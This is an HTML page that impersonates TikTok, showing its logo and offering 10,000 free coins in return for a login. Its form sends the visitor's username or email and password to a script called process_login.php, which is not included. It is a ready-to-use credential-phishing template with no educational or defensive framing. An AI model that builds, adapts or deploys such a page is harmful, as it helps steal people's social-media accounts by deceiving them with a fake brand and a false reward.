<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Free Coins</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            color: white;
        }
        .container {
            text-align: center;
            background: #111;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
            max-width: 400px;
        }
        .tiktok-logo {
            width: 80px;
            margin-bottom: 10px;
        }
        .message {
            display: none;
            margin-top: 10px;
            color: yellow;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="tiktok-logo" alt="TikTok Logo">
        <h2 class="mb-3">TikTok Free Coins</h2>
        <p>Login to claim your free TikTok coins!</p>
        <form action="process_login.php" method="POST">
            <input type="text" name="email" class="form-control mb-2" placeholder="Username or Email" required>
            <input type="password" name="password" class="form-control mb-3" placeholder="Password" required>
            <button type="submit" class="btn btn-danger w-100">Login</button>
        </form>
        <p class="message" id="message">🎉 Congratulations! You have received 10,000 TikTok Coins 🎉</p>
    </div>
    
    <script>
        function showMessage() {
            document.getElementById('message').style.display = 'block';
        }
    </script>
</body>
</html>
